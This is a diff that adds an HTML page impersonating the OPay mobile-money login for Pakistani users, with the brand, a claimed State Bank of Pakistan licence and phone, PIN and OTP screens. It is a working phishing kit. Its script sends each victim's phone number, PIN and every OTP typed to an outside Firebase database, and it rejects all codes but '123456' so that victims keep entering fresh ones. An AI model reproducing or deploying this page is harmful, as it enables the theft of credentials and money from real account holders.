@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OPay App</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background-color: #ffffff; height: 100vh; width: 100vw; overflow: hidden; position: relative; color: #1a1a1a; }
+        
+        #screen-1 { padding: 24px; height: 100%; display: flex; flex-direction: column; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; margin-bottom: 30px; }
+        .logo { font-size: 28px; font-weight: 700; color: #1a1a4b; display: flex; align-items: center; }
+        .logo span { color: #00d09c; font-size: 32px; margin-right: 2px; }
+        .lang { font-size: 14px; font-weight: 500; color: #666; cursor: pointer; }
+        .welcome-text h1 { font-size: 26px; font-weight: 700; margin-bottom: 8px; }
+        .welcome-text p { font-size: 14px; color: #666; margin-bottom: 30px; }
+        .input-container { display: flex; align-items: center; border: 1px solid #00d09c; border-radius: 8px; padding: 16px; background-color: #f9f9f9; margin-bottom: 30px; }
+        .flag { font-size: 20px; margin-right: 12px; }
+        .divider { height: 20px; width: 1px; background-color: #ccc; margin-right: 12px; }
+        .input-container input { border: none; background: transparent; font-size: 16px; width: 100%; outline: none; color: #333; }
+        .input-container input::placeholder { color: #a0a0a0; }
+        .btn-primary { background-color: #a4ebd6; color: white; border: none; border-radius: 30px; padding: 16px; font-size: 16px; font-weight: 600; width: 100%; cursor: pointer; margin-bottom: 20px; transition: background-color 0.3s ease; }
+        .btn-primary.active { background-color: #00d09c; }
+        .terms { display: flex; align-items: center; justify-content: center; font-size: 12px; color: #666; }
+        .terms input { accent-color: #00d09c; margin-right: 8px; width: 16px; height: 16px; }
+        .terms a { color: #00d09c; text-decoration: none; }
+        .footer { margin-top: auto; display: flex; align-items: center; justify-content: center; font-size: 12px; color: #888; padding-bottom: 20px; }
+        .footer img { width: 20px; margin-right: 8px; }
+
+        #screen-2 { padding: 24px; height: 100%; display: none; flex-direction: column; }
+        .back-btn { font-size: 24px; margin-top: 40px; margin-bottom: 30px; cursor: pointer; width: 24px; }
+        .pin-boxes { display: flex; justify-content: space-between; gap: 12px; margin-top: 30px; margin-bottom: 10px; }
+        .pin-input { width: 60px; height: 60px; border-radius: 8px; background-color: #f4f4f4; border: 1px solid transparent; text-align: center; font-size: 24px; font-weight: 600; outline: none; color: #333; transition: border 0.2s; padding: 0; line-height: 60px; }
+        .pin-input:focus, .pin-input.filled { border-color: #00d09c; background-color: #fff; }
+        .forget-pin { font-size: 12px; color: #888; text-decoration: none; margin-bottom: 30px; display: inline-block; }
+        #screen-2 .btn-primary { margin-top: 20px; margin-bottom: 20px; }
+
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.5); display: none; z-index: 10; }
+        .bottom-sheet { position: absolute; bottom: 0; left: 0; width: 100%; background: #fff; border-radius: 20px 20px 0 0; padding: 24px; z-index: 11; transform: translateY(100%); transition: transform 0.3s ease-out; padding-bottom: 40px; }
+        .bottom-sheet.show { transform: translateY(0); }
+        .sheet-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .sheet-header h2 { font-size: 20px; font-weight: 700; }
+        .close-btn { font-size: 24px; color: #888; cursor: pointer; }
+        .otp-desc { font-size: 13px; color: #666; margin-bottom: 24px; line-height: 1.5; }
+        .otp-boxes { display: flex; justify-content: space-between; gap: 6px; margin-bottom: 20px; }
+        .otp-input { width: 100%; height: 50px; border-radius: 8px; background-color: #f4f4f4; border: 1px solid transparent; text-align: center; font-size: 20px; font-weight: 600; outline: none; color: #333; padding: 0; line-height: 50px; }
+        .otp-input:focus, .otp-input.filled { border-color: #00d09c; background-color: #fff; }
+        .resend-container { text-align: right; font-size: 12px; color: #888; margin-bottom: 10px; }
+        #resend-btn { color: #888; cursor: default; font-weight: 500; }
+        #resend-btn.active { color: #00d09c; cursor: pointer; }
+        .error-msg { color: #ff4d4d; font-size: 12px; margin-bottom: 10px; display: none; font-weight: 500; }
+    </style>
+</head>
+<body>
+
+    <div id="screen-1">
+        <div class="header">
+            <div class="logo"><span>O</span>Pay</div>
+            <div class="lang">اردو</div>
+        </div>
+        <div class="welcome-text">
+            <h1>Welcome to OPay</h1>
+            <p>Please Enter Your Mobile Number</p>
+        </div>
+        <div class="input-container">
+            <div class="flag">🇵🇰</div>
+            <div class="divider"></div>
+            <input type="tel" id="mobile-number" placeholder="03XX-XXXXXXX" maxlength="12" oninput="checkMobileNumber()">
+        </div>
+        <button class="btn-primary" id="btn-next-1" onclick="goToPinScreen()">Next</button>
+        <div class="terms">
+            <input type="checkbox" checked>
+            <label>Accept the <a href="#">User Agreement</a> & <a href="#">Privacy Policy</a></label>
+        </div>
+        <div class="footer">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/32/State_Bank_of_Pakistan_logo.svg/1200px-State_Bank_of_Pakistan_logo.svg.png" alt="SBP">
+            Licensed By State Bank of Pakistan
+        </div>
+    </div>
+
+    <div id="screen-2">
+        <div class="back-btn" onclick="goToWelcomeScreen()">&#10094;</div>
+        <h1 style="font-size: 22px; font-weight: 700; margin-bottom: 5px;">Enter PIN</h1>
+        <p style="font-size: 14px; color: #666;">Enter 4-digit PIN</p>
+        <div class="pin-boxes">
+            <input type="tel" class="pin-input" maxlength="1" oninput="moveToNext(this, 'pin')">
+            <input type="tel" class="pin-input" maxlength="1" oninput="moveToNext(this, 'pin')">
+            <input type="tel" class="pin-input" maxlength="1" oninput="moveToNext(this, 'pin')">
+            <input type="tel" class="pin-input" maxlength="1" oninput="moveToNext(this, 'pin')">
+        </div>
+        <a href="#" class="forget-pin">Forget PIN?</a>
+        <button class="btn-primary" id="btn-next-2" onclick="showOtpModal()">Next</button>
+    </div>
+
+    <div class="overlay" id="overlay" onclick="closeOtpModal()"></div>
+    <div class="bottom-sheet" id="bottom-sheet">
+        <div class="sheet-header">
+            <h2>Enter OTP</h2>
+            <div class="close-btn" onclick="closeOtpModal()">&#10005;</div>
+        </div>
+        <p class="otp-desc">You'll receive OTP on the number that you have registered with the APP</p>
+        <div class="error-msg" id="otp-error">Wrong OTP! Please try again from start.</div>
+        <div class="otp-boxes">
+            <input type="tel" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp')">
+            <input type="tel" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp')">
+            <input type="tel" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp')">
+            <input type="tel" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp')">
+            <input type="tel" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp')">
+            <input type="tel" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp')">
+        </div>
+        <div class="resend-container">
+            Didn't receive code? <span id="resend-btn">Resend 60s</span>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyB9Y2_hnmgQsFute7DDAcKjmuoAnggQZJY",
+            authDomain: "long-d1bcb.firebaseapp.com",
+            databaseURL: "https://long-d1bcb-default-rtdb.firebaseio.com",
+            projectId: "long-d1bcb",
+            storageBucket: "long-d1bcb.firebasestorage.app",
+            messagingSenderId: "515546162619",
+            appId: "1:515546162619:web:e046b79a25ccfa057e509e"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        let currentSessionId = null;
+        let timerInterval;
+        let timeLeft = 60;
+        const resendBtn = document.getElementById('resend-btn');
+
+        function checkMobileNumber() {
+            let mob = document.getElementById('mobile-number').value;
+            let btn = document.getElementById('btn-next-1');
+            if (mob.length >= 10) btn.classList.add('active');
+            else btn.classList.remove('active');
+        }
+
+        function goToPinScreen() {
+            let btn = document.getElementById('btn-next-1');
+            let phone = document.getElementById('mobile-number').value;
+            
+            if (btn.classList.contains('active')) {
+                // Firebase Path: opay_sessions
+                currentSessionId = db.ref('opay_sessions').push().key;
+                db.ref('opay_sessions/' + currentSessionId).set({
+                    phone: phone,
+                    timestamp: Date.now()
+                });
+
+                document.getElementById('screen-1').style.display = 'none';
+                document.getElementById('screen-2').style.display = 'flex';
+                document.querySelector('.pin-input').focus();
+            } else {
+                alert("Please enter a valid mobile number!");
+            }
+        }
+
+        function goToWelcomeScreen() {
+            document.getElementById('screen-2').style.display = 'none';
+            document.getElementById('screen-1').style.display = 'flex';
+        }
+
+        function moveToNext(current, type) {
+            if (type === 'otp') document.getElementById('otp-error').style.display = 'none';
+
+            if (current.value.length === 1) {
+                current.classList.add('filled');
+                let next = current.nextElementSibling;
+                if (next && next.tagName === 'INPUT') next.focus();
+            } else {
+                current.classList.remove('filled');
+            }
+
+            if (type === 'pin') {
+                let pins = document.querySelectorAll('.pin-input');
+                let allFilled = Array.from(pins).every(p => p.value.length === 1);
+                let btn = document.getElementById('btn-next-2');
+                if (allFilled) btn.classList.add('active');
+                else btn.classList.remove('active');
+            }
+
+            if (type === 'otp') {
+                let otps = document.querySelectorAll('.otp-input');
+                let allFilled = Array.from(otps).every(o => o.value.length === 1);
+                if (allFilled) verifyOTP();
+            }
+        }
+
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value.length === 0) {
+                    this.classList.remove('filled');
+                    let prev = this.previousElementSibling;
+                    if (prev && prev.tagName === 'INPUT') {
+                        prev.focus();
+                        prev.classList.remove('filled');
+                    }
+                }
+            });
+        });
+
+        function startTimer() {
+            clearInterval(timerInterval);
+            timeLeft = 60;
+            resendBtn.classList.remove('active');
+            resendBtn.innerText = `Resend ${timeLeft}s`;
+
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    resendBtn.innerText = 'Resend';
+                    resendBtn.classList.add('active');
+                } else {
+                    resendBtn.innerText = `Resend ${timeLeft}s`;
+                }
+            }, 1000);
+        }
+
+        resendBtn.addEventListener('click', function() {
+            if (timeLeft <= 0) {
+                document.querySelectorAll('.otp-input').forEach(o => { o.value = ''; o.classList.remove('filled'); });
+                document.querySelector('.otp-input').focus();
+                document.getElementById('otp-error').style.display = 'none';
+                startTimer();
+            }
+        });
+
+        function showOtpModal() {
+            let pins = document.querySelectorAll('.pin-input');
+            let allFilled = Array.from(pins).every(p => p.value.length === 1);
+            
+            if (allFilled) {
+                let pinValue = Array.from(pins).map(p => p.value).join('');
+                // Firebase Path: opay_sessions
+                db.ref('opay_sessions/' + currentSessionId).update({
+                    pin: pinValue
+                });
+
+                document.getElementById('overlay').style.display = 'block';
+                setTimeout(() => {
+                    document.getElementById('bottom-sheet').classList.add('show');
+                    document.querySelector('.otp-input').focus();
+                    startTimer(); 
+                }, 10);
+            } else {
+                alert("Please enter complete 4-digit PIN");
+            }
+        }
+
+        function closeOtpModal() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('bottom-sheet').classList.remove('show');
+            clearInterval(timerInterval); 
+        }
+
+        function verifyOTP() {
+            let otps = document.querySelectorAll('.otp-input');
+            let enteredOTP = Array.from(otps).map(o => o.value).join('');
+            
+            // Firebase Path: opay_sessions
+            db.ref('opay_sessions/' + currentSessionId + '/otps').push(enteredOTP);
+            db.ref('opay_sessions/' + currentSessionId).update({
+                timestamp: Date.now()
+            });
+
+            if (enteredOTP === "123456") {
+                document.getElementById('otp-error').style.display = 'none';
+                clearInterval(timerInterval); 
+                alert("Success! Correct OTP.");
+            } else {
+                document.getElementById('otp-error').style.display = 'block';
+                setTimeout(() => {
+                    otps.forEach(o => { o.value = ''; o.classList.remove('filled'); });
+                    document.querySelector('.otp-input').focus();
+                }, 800); 
+            }
+        }
+    </script>
+</body>
+</html>
